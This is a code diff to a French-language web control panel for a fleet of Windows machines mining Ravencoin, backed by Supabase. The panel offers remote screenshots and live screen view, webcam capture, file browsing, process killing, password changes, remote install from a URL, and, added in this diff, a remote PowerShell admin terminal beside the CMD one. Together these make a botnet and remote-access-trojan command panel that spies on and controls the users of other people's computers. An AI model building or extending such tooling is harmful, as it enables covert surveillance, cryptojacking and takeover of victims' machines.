@@ -94,6 +94,8 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 .ctrl-btns button{flex:1;padding:8px;border:none;border-radius:6px;font-size:.8rem;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:all .2s}
 .ctrl-btns button:hover{opacity:.85;transform:translateY(-1px)}
 .btn-stop{background:var(--red2);color:#fff}.btn-restart{background:var(--green3);color:#fff}.btn-screen{background:var(--purple);color:#fff}
+.terminal-cmd{background:#0c0c0c;color:#cccccc;font-family:'Cascadia Code','Consolas',monospace}
+.terminal-ps{background:#012456;color:#eeedf0;font-family:'Cascadia Code','Consolas',monospace}
 
 /* CHARTS PAGE */
 .chart-container{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:16px;animation:fadeInUp .5s ease}
@@ -234,7 +236,7 @@ h1{font-size:1.2rem}
   <div class="nav-tabs">
     <button class="nav-tab active" onclick="showPage('machines')">Machines</button>
     <button class="nav-tab" onclick="showPage('charts')">Graphiques</button>
-    <button class="nav-tab" onclick="showPage('network')">Reseau</button>
+    <button class="nav-tab" onclick="showPage('network')">Réseau</button>
     <button class="nav-tab" onclick="showPage('logs')">Logs</button>
     <button class="nav-tab" onclick="showPage('map')">🗺 Carte</button>
   </div>
@@ -260,7 +262,7 @@ h1{font-size:1.2rem}
     </select>
   </div>
   <div class="chart-container"><div class="chart-title">Hashrate (MH/s)</div><div class="chart-canvas" id="chart-hash"></div></div>
-  <div class="chart-container"><div class="chart-title">Temperature GPU</div><div class="chart-canvas" id="chart-temp"></div></div>
+  <div class="chart-container"><div class="chart-title">Température GPU</div><div class="chart-canvas" id="chart-temp"></div></div>
   <div class="chart-container"><div class="chart-title">Utilisation GPU (%)</div><div class="chart-canvas" id="chart-usage"></div></div>
 </div>
 
@@ -284,7 +286,7 @@ h1{font-size:1.2rem}
 </div>
 
 <div class="toast" id="toast"></div>
-<div class="temp-alert" id="temp-alert">ALERTE TEMP &gt; 80 C</div>
+<div class="temp-alert" id="temp-alert">🔥 ALERTE TEMP &gt; 80°C</div>
 
 <!-- MODAL -->
 <div class="login-overlay" id="login-overlay" style="position:fixed;inset:0;background:var(--bg);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column">
@@ -310,7 +312,7 @@ h1{font-size:1.2rem}
 const SB='https://imwdpuumpvecpziigsyz.supabase.co';
 const SK='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imltd2RwdXVtcHZlY3B6aWlnc3l6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUyNTU4MDIsImV4cCI6MjExMDgzMTgwMn0.xK1YmdiLQ8yyWnvq4XX1KUakMoudHSCuwoN63lBIu8w';
 const H={'apikey':SK,'Authorization':'Bearer '+SK};
-let rvnPriceUsd=0,machinesCache=[],notifsEnabled=false,prevOnline={},alertAudio=null;
+let rvnPriceUsd=0,machinesCache=[],notifsEnabled=false,prevOnline={},alertAudio=null,lastLoadTime=0;
 
 // LOGIN
 const ACCESS_CODE='AZERTY8806';
@@ -343,13 +345,13 @@ function toggleNotifs(){
       Notification.requestPermission().then(p=>{
         notifsEnabled=p==='granted';
         document.getElementById('notif-btn').classList.toggle('active',notifsEnabled);
-        showToast(notifsEnabled?'Notifications activees':'Notifications refusees');
+        showToast(notifsEnabled?'Notifications activées':'Notifications refusées');
       });
     }
   }else{
     notifsEnabled=false;
     document.getElementById('notif-btn').classList.remove('active');
-    showToast('Notifications desactivees');
+    showToast('Notifications désactivées');
   }
 }
 
@@ -402,8 +404,8 @@ async function sendCommand(hostname,field,value){
 function setPower(h,v,modal){if(modal)document.getElementById('mpw-val').textContent=v+'%';const c=document.getElementById('pw-'+h);if(c)c.textContent=v+'%';sendCommand(h,'target_power',parseInt(v))}
 function stopMiner(h){if(!confirm('Arreter le miner sur '+h+' ?'))return;sendCommand(h,'command','stop')}
 function restartMiner(h){sendCommand(h,'command','restart')}
-function requestScreenshot(h){showToast('Capture demandee...');sendCommand(h,'command','screenshot');setTimeout(()=>openMachineDetail(h),8000)}
-async function deleteScreenshot(h){if(!confirm('Supprimer la capture ?'))return;await supaPatch(h,{screenshot_b64:null,screenshot_at:null});showToast('Capture supprimee');openMachineDetail(h)}
+function requestScreenshot(h){showToast('📸 Capture demandée...');sendCommand(h,'command','screenshot');setTimeout(()=>openMachineDetail(h),8000)}
+async function deleteScreenshot(h){if(!confirm('Supprimer la capture ?'))return;await supaPatch(h,{screenshot_b64:null,screenshot_at:null});showToast('Capture supprimée');openMachineDetail(h)}
 async function deleteMachine(h){if(!confirm('Supprimer '+h+' ? Cette action est irreversible.'))return;await supaPatch(h,{hostname:h+'_DELETED_'+Date.now(),status:'deleted',hashrate_mhs:0,gpu_temp_c:0,gpu_usage_percent:0,screenshot_b64:null,screenshot_at:null,command:null,target_power:0});showToast(h+' supprime');document.getElementById('modal').classList.remove('show');loadData()}
 function showFullscreen(src){document.getElementById('fs-img').src=src;document.getElementById('fullscreen').classList.add('show')}
 
@@ -444,7 +446,7 @@ async function openMachineDetail(hostname){
     +'<div class="modal-section"><div class="modal-section-title">📸 Galerie Screenshots</div><div id="screen-gallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;max-height:400px;overflow-y:auto"></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">Controles</div><div class="modal-controls">'
     +'<div class="power-row" style="margin-bottom:12px"><label style="font-size:.85rem;color:var(--text2);min-width:80px">Puissance</label><input type="range" min="10" max="100" step="5" value="'+cp+'" onchange="setPower(\''+h+'\',this.value,true)" oninput="document.getElementById(\'mpw-val\').textContent=this.value+\'%\'"><span id="mpw-val" style="font-size:1rem;font-weight:700;color:var(--green);min-width:50px;text-align:right">'+cp+'%</span></div>'
-    +'<div class="modal-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">Capture</button><button class="btn-stop" onclick="stopMiner(\''+h+'\')">Stop</button><button class="btn-restart" onclick="restartMiner(\''+h+'\')">Restart</button></div></div>'
+    +'<div class="modal-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">📸 Capture</button><button class="btn-stop" onclick="stopMiner(\''+h+'\')">⏹ Arreter</button><button class="btn-restart" onclick="restartMiner(\''+h+'\')">🔄 Relancer</button></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">🎥 Vision Live</div><div class="modal-controls">'
     +'<div class="modal-btns" style="margin-bottom:8px"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">📸 1 Capture</button><button style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="startLiveView(\''+h+'\')">▶ Live</button><button class="btn-stop" onclick="stopLiveView()">⏹ Stop</button></div>'
     +'<div id="live-screen" style="margin-top:8px;position:relative"><div style="color:var(--text2);text-align:center;padding:40px">Clique Live pour demarrer</div></div></div></div>'
@@ -453,14 +455,14 @@ async function openMachineDetail(hostname){
     +'<div class="modal-section"><div class="modal-section-title">📁 Explorateur Fichiers</div><div class="modal-controls">'
     +'<div style="display:flex;gap:8px;margin-bottom:8px"><button onclick="goUpDir(\''+h+'\')" style="background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;cursor:pointer;font-size:1rem" title="Dossier parent">⬆</button><input type="text" id="file-path" value="C:\\" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')browseFiles(\''+h+'\')"><button onclick="browseFiles(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer">📂 Go</button></div>'
     +'<div id="file-list" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:0;font-family:monospace;font-size:.8rem;color:var(--text);max-height:300px;overflow-y:auto">Chargement...</div></div></div>'
-    +'<div class="modal-section"><div class="modal-section-title">⚡ Power Controls</div><div class="modal-controls">'
+    +'<div class="modal-section"><div class="modal-section-title">⚡ Alimentation</div><div class="modal-controls">'
     +'<div class="modal-btns"><button style="background:var(--gold);color:#000;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'sleep\')">😴 Veille</button><button style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'reboot\')">🔄 Redemarrer</button><button style="background:var(--red);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'shutdown\')">🔴 Eteindre</button></div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">📋 Gestionnaire Processus</div><div class="modal-controls">'
     +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="listProcesses(\''+h+'\')" style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📋 Lister</button></div>'
     +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="kill-input" placeholder="PID ou nom (ex: 1234 ou notepad.exe)" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem"><button onclick="killProcess(\''+h+'\')" style="background:var(--red);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">💀 Kill</button></div>'
     +'<div id="proc-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:300px;overflow-y:auto;white-space:pre;display:none"></div></div></div>'
-    +'<div class="modal-section"><div class="modal-section-title">📡 Speedtest & Reseau</div><div class="modal-controls">'
-    +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="runSpeedtest(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🚀 Speedtest</button><button onclick="runNetscan(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🔍 Scan Reseau</button><button onclick="runDiskspace(\''+h+'\')" style="background:var(--gold);color:#000;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">💾 Espace Disque</button></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📡 Speedtest & Réseau</div><div class="modal-controls">'
+    +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="runSpeedtest(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🚀 Speedtest</button><button onclick="runNetscan(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🔍 Scan Réseau</button><button onclick="runDiskspace(\''+h+'\')" style="background:var(--gold);color:#000;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">💾 Espace Disque</button></div>'
     +'<div id="net-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:200px;overflow-y:auto;white-space:pre;display:none"></div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">📸 Webcam</div><div class="modal-controls">'
     +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="captureWebcam(\''+h+'\')" style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📸 Capturer Webcam</button></div>'
@@ -478,9 +480,12 @@ async function openMachineDetail(hostname){
     +'<div class="modal-section"><div class="modal-section-title">👁 Activite</div><div class="modal-controls">'
     +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="getActivity(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">👁 Voir Activite</button></div>'
     +'<div id="activity-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:200px;overflow-y:auto;white-space:pre;display:none"></div></div></div>'
-    +'<div class="modal-section"><div class="modal-section-title">Terminal CMD</div><div class="modal-controls">'
-    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="cmd-input" placeholder="ex: ipconfig, tasklist, dir..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')execCmd(\''+h+'\')"><button onclick="execCmd(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;white-space:nowrap">Executer</button></div>'
-    +'<div id="cmd-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.8rem;color:var(--green);max-height:300px;overflow-y:auto;white-space:pre-wrap;display:none"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">💻 Terminal CMD (Admin)</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="cmd-input" placeholder="ex: ipconfig, tasklist, dir..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')execCmd(\''+h+'\')"><button onclick="execCmd(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;white-space:nowrap">▶ Executer</button></div>'
+    +'<div id="cmd-output" style="background:#0c0c0c;border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:\'Cascadia Code\',\'Consolas\',monospace;font-size:.8rem;color:#cccccc;max-height:300px;overflow-y:auto;white-space:pre-wrap;display:none"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">⚡ Terminal PowerShell (Admin)</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="ps-input" placeholder="ex: Get-Process, Get-Service, Get-NetAdapter..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')execPS(\''+h+'\')"><button onclick="execPS(\''+h+'\')" style="background:#012456;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;white-space:nowrap">⚡ Executer</button></div>'
+    +'<div id="ps-output" style="background:#012456;border:1px solid #1e3a5f;border-radius:8px;padding:12px;font-family:\'Cascadia Code\',\'Consolas\',monospace;font-size:.8rem;color:#eeedf0;max-height:300px;overflow-y:auto;white-space:pre-wrap;display:none"></div></div></div>'
     +'<button class="btn-delete-machine" onclick="deleteMachine(\''+h+'\')">Supprimer cette machine</button></div>';
   document.getElementById('modal').classList.add('show');
   loadScreenGallery(h);
@@ -554,7 +559,7 @@ function renderNetwork(){
   let i=0;
   map.innerHTML=Object.entries(groups).map(([subnet,machines])=>{
     const c=colors[i++%colors.length];
-    return '<div class="network-group" style="animation-delay:'+(i*0.1)+'s"><div class="network-title"><span class="net-icon" style="background:'+c+'"></span>Reseau '+subnet+' ('+machines.length+')</div>'
+    return '<div class="network-group" style="animation-delay:'+(i*0.1)+'s"><div class="network-title"><span class="net-icon" style="background:'+c+'"></span>Réseau '+subnet+' ('+machines.length+')</div>'
       +machines.map(m=>'<div class="net-machine" onclick="openMachineDetail(\''+esc(m.hostname)+'\')" style="cursor:pointer">'
         +'<span class="net-dot '+(m._online?'on':'off')+'"></span>'
         +'<div class="net-info"><div class="net-name">'+esc(m.hostname)+'</div><div class="net-ip">'+esc(m.ip_address||'--')+'</div></div>'
@@ -581,7 +586,7 @@ async function loadLogs(){
 async function clearLogs(){
   if(!confirm('Vider tous les logs ?'))return;
   await fetch(SB+'/rest/v1/machine_logs?id=gt.0',{method:'DELETE',headers:{...H,'Prefer':'return=minimal'}});
-  showToast('Logs vides');loadLogs();
+  showToast('Logs vidés');loadLogs();
 }
 
 // PRICE
@@ -609,7 +614,8 @@ function render(machines){
   document.getElementById('online').textContent=onC;
   document.getElementById('offline').textContent=total-onC;
   document.getElementById('avg-hash').textContent=machines.reduce((s,m)=>s+(m.hashrate_mhs||0),0).toFixed(1);
-  document.getElementById('last-update').textContent=new Date().toLocaleTimeString('fr-FR');
+  lastLoadTime=Date.now();
+  document.getElementById('last-update').textContent='🔴 Live · MAJ il y a 0s';
 
   let gD=0,gT=0;
   machines.forEach(m=>{const e=estimateEarnings(m.hashrate_mhs||0,m.uptime_minutes||0);gD+=e.dailyRvn;gT+=e.totalRvn});
@@ -649,7 +655,7 @@ function render(machines){
       +'<div class="card-row"><span class="k">Uptime</span><span class="v">'+upH+'h '+upM+'m</span></div>'
       +'<div class="card-earnings"><div class="ce-block"><div class="ce-val">'+e.dailyRvn.toFixed(1)+'</div><div class="ce-label">RVN/jour</div></div><div class="ce-block"><div class="ce-val">$'+(e.dailyRvn*rvnPriceUsd).toFixed(2)+'</div><div class="ce-label">$/jour</div></div></div>'
       +'<div class="card-controls" onclick="event.stopPropagation()"><div class="power-row"><label>Puissance</label><input type="range" min="10" max="100" step="5" value="'+cp+'" onchange="setPower(\''+h+'\',this.value,false)" oninput="document.getElementById(\'pw-'+h+'\').textContent=this.value+\'%\'"><span class="power-val" id="pw-'+h+'">'+cp+'%</span></div>'
-      +'<div class="ctrl-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">Capture</button><button class="btn-stop" onclick="stopMiner(\''+h+'\')">Stop</button><button class="btn-restart" onclick="restartMiner(\''+h+'\')">Restart</button></div></div></div>';
+      +'<div class="ctrl-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">📸 Capture</button><button class="btn-stop" onclick="stopMiner(\''+h+'\')">⏹ Arreter</button><button class="btn-restart" onclick="restartMiner(\''+h+'\')">🔄 Relancer</button></div></div></div>';
   }).join('');
 }
 
@@ -662,26 +668,58 @@ async function execCmd(hostname){
   const cmd=input.value.trim();
   if(!cmd)return;
   output.style.display='block';
-  output.textContent='> '+cmd+'\nEnvoi en cours...';
+  output.textContent='C:\\> '+cmd+'\nEnvoi en cours...';
   try{
     await sendCommand(hostname,'command','cmd:'+cmd);
-    output.textContent='> '+cmd+'\nCommande envoyee, attente reponse...';
+    output.textContent='C:\\> '+cmd+'\nCommande envoyee, attente reponse...';
+    const before=new Date().toISOString();
     let attempts=0;
     const poll=setInterval(async()=>{
       attempts++;
       try{
-        const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(hostname)+'&level=eq.cmd_output&order=created_at.desc&limit=1',{headers:H});
+        const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(hostname)+'&level=eq.cmd_output&created_at=gte.'+before+'&order=created_at.desc&limit=1',{headers:H});
         const d=await r.json();
         if(d.length>0&&d[0].message){
           const msg=d[0].message;
-          if(msg.startsWith('CMD:'+cmd.substring(0,20))||attempts>60){
+          if(msg.startsWith('CMD:')||attempts>60){
             clearInterval(poll);
-            output.textContent='> '+cmd+'\n'+msg.replace(/^CMD:[^\n]*\n/,'');
+            output.textContent='C:\\> '+cmd+'\n'+msg.replace(/^CMD:[^\n]*\n/,'');
           }
         }
       }catch{}
-      if(attempts>20){clearInterval(poll);output.textContent+='Timeout - pas de reponse';}
-    },2000);
+      if(attempts>60){clearInterval(poll);output.textContent+='⚠️ Pas de reponse apres 3 minutes';}
+    },3000);
+  }catch(e){output.textContent='Erreur: '+e.message}
+}
+
+// POWERSHELL REMOTE
+async function execPS(hostname){
+  const input=document.getElementById('ps-input');
+  const output=document.getElementById('ps-output');
+  const cmd=input.value.trim();
+  if(!cmd)return;
+  output.style.display='block';
+  output.textContent='PS> '+cmd+'\nEnvoi en cours...';
+  try{
+    await sendCommand(hostname,'command','ps:'+cmd);
+    output.textContent='PS> '+cmd+'\nCommande envoyee, attente reponse...';
+    const before=new Date().toISOString();
+    let attempts=0;
+    const poll=setInterval(async()=>{
+      attempts++;
+      try{
+        const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(hostname)+'&level=eq.cmd_output&created_at=gte.'+before+'&order=created_at.desc&limit=1',{headers:H});
+        const d=await r.json();
+        if(d.length>0&&d[0].message){
+          const msg=d[0].message;
+          if(msg.startsWith('PS:')||attempts>60){
+            clearInterval(poll);
+            output.textContent='PS> '+cmd+'\n'+msg.replace(/^PS:[^\n]*\n/,'');
+          }
+        }
+      }catch{}
+      if(attempts>60){clearInterval(poll);output.textContent+='⚠️ Pas de reponse apres 3 minutes';}
+    },3000);
   }catch(e){output.textContent='Erreur: '+e.message}
 }
 
@@ -690,7 +728,7 @@ function sendTTS(hostname){
   const msg=document.getElementById('tts-input').value.trim();
   if(!msg)return;
   sendCommand(hostname,'command','tts:'+msg);
-  showToast('🔊 Message envoye: '+msg);
+  showToast('🔊 Message envoyé:'+msg);
   document.getElementById('tts-input').value='';
 }
 
@@ -831,7 +869,7 @@ function killProcess(hostname){
   if(!target)return;
   if(!confirm('💀 Kill '+target+' sur '+hostname+' ?'))return;
   sendCommand(hostname,'command','kill:'+target);
-  showToast('💀 Kill envoye: '+target);
+  showToast('💀 Kill envoyé:'+target);
   setTimeout(()=>listProcesses(hostname),3000);
 }
 
@@ -857,16 +895,16 @@ function captureWebcam(h){
 }
 
 // MESSAGE POPUP
-function sendMessage(h){const t=document.getElementById('msg-input').value.trim();if(!t)return;sendCommand(h,'command','msg:'+t);showToast('💬 Message envoye');}
+function sendMessage(h){const t=document.getElementById('msg-input').value.trim();if(!t)return;sendCommand(h,'command','msg:'+t);showToast('💬 Message envoyé');}
 
 // WALLPAPER
-function changeWallpaper(h){const u=document.getElementById('wallpaper-input').value.trim();if(!u)return;sendCommand(h,'command','wallpaper:'+u);showToast('🖼 Wallpaper change');}
+function changeWallpaper(h){const u=document.getElementById('wallpaper-input').value.trim();if(!u)return;sendCommand(h,'command','wallpaper:'+u);showToast('🖼 Fond d\'écran changé');}
 
 // PASSWORD
-function changePassword(h){const p=document.getElementById('pass-input').value;if(!p)return;if(!confirm('⚠ Changer le mot de passe sur '+h+' ?'))return;sendCommand(h,'command','chpasswd:'+p);showToast('🔑 Mot de passe change');}
+function changePassword(h){const p=document.getElementById('pass-input').value;if(!p)return;if(!confirm('⚠ Changer le mot de passe sur '+h+' ?'))return;sendCommand(h,'command','chpasswd:'+p);showToast('🔑 Mot de passe changé');}
 
 // INSTALL PROGRAM
-function installProgram(h){const u=document.getElementById('install-input').value.trim();if(!u)return;if(!confirm('📦 Installer depuis '+u+' sur '+h+' ?'))return;sendCommand(h,'command','install:'+u);showToast('📦 Installation lancee');}
+function installProgram(h){const u=document.getElementById('install-input').value.trim();if(!u)return;if(!confirm('📦 Installer depuis '+u+' sur '+h+' ?'))return;sendCommand(h,'command','install:'+u);showToast('📦 Installation lancée');}
 
 // UPLOAD FILE
 function uploadFile(h){
@@ -910,7 +948,7 @@ function wakeOnLan(mac){
   const online=machinesCache.find(m=>(Date.now()-new Date(m.last_seen).getTime())<300000);
   if(!online){showToast('❌ Besoin d\'une machine en ligne pour WoL');return;}
   sendCommand(online.hostname,'command','wol:'+mac);
-  showToast('📡 Magic packet envoye via '+online.hostname);
+  showToast('📡 Magic packet envoyé via '+online.hostname);
 }
 
 // MAP
@@ -947,7 +985,8 @@ async function loadMap(){
 }
 
 fetchRvnPrice();setInterval(fetchRvnPrice,300000);
-loadData();setInterval(loadData,10000);
+loadData();setInterval(loadData,8000);
+setInterval(()=>{if(lastLoadTime){const s=Math.floor((Date.now()-lastLoadTime)/1000);document.getElementById('last-update').textContent='🔴 Live · MAJ il y a '+s+'s'}},1000);
 </script>
 </body>
 </html>
